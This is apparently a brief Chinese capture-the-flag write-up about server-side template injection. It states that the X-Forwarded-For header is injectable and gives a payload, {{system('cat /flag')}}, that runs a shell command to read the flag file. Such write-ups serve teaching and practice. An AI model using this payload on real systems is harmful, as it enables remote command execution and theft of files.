#SSTI

页面中 API 写着 get IP 与 get XFF  
x-Forward-For 存在注入

```url
X-Forwarded-For:
X-Forwarded-For: {{system('cat /flag')}}
```
